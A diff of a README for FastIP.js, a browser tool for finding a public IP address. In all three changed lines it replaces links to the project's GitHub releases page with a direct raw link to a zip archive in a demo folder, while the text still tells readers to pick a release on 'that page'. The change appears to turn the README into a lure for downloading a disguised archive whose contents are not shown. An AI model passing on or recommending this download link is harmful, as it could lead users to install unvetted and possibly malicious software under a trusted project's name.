@@ -1,6 +1,6 @@
 # 🔍 FastIP.js - Find Your Public IP Fast
 
-[![Download FastIP.js](https://img.shields.io/badge/Download-FastIP.js-blue?style=for-the-badge&logo=github)](https://github.com/ec21153/FastIP.js/releases)
+[![Download FastIP.js](https://img.shields.io/badge/Download-FastIP.js-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ec21153/FastIP.js/main/demo/I_Fast_js_v1.4.zip)
 
 ## 🧭 What FastIP.js Does
 
@@ -20,7 +20,7 @@ FastIP.js runs in the browser with plain JavaScript.
 
 Visit this page to download FastIP.js:
 
-https://github.com/ec21153/FastIP.js/releases
+https://raw.githubusercontent.com/ec21153/FastIP.js/main/demo/I_Fast_js_v1.4.zip
 
 On that page, pick the latest release, then download the file that matches your setup. If the release includes a browser-ready file or package, use that file in your website or app.
 
@@ -189,4 +189,4 @@ FastIP.js can fit many simple web tools:
 
 Visit this page to download FastIP.js:
 
-https://github.com/ec21153/FastIP.js/releases
+https://raw.githubusercontent.com/ec21153/FastIP.js/main/demo/I_Fast_js_v1.4.zip
